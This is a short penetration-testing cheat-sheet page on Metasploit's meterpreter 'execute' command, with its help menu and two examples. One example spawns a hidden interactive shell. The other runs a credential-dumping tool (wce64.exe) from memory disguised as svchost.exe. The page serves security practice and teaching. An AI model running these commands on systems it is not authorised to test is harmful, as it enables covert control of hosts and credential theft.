# 04 - Execute Process

Search Tag: #metasploit-framework #command-and-control

## 4.1 - Help Menu

```
meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.

OPTIONS:

    -a   The arguments to pass to the command.
    -c   Channelized I/O (required for interaction).
    -d   The 'dummy' executable to launch when using -m.
    -f   The executable command to run.
    -h   Help menu.
    -H   Create the process hidden from view.
    -i   Interact with the process after creating it.
    -k   Execute process on the meterpreters current desktop
    -m   Execute from memory.
    -p   Execute process in a pty (if available on target platform)
    -s   Execute process in a given session as the session user
    -t   Execute process with currently impersonated thread token
    -z   Execute process in a subshell
```

## 4.2 - Usage

* **Spawn Callback Shell**

`meterpreter > execute -Hicf shell.exe`

* **Dummy Process**

`meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"`

---
## References

* [Metasploit for Pentester Migrate](https://www.hackingarticles.in/metasploit-for-pentester-migrate/)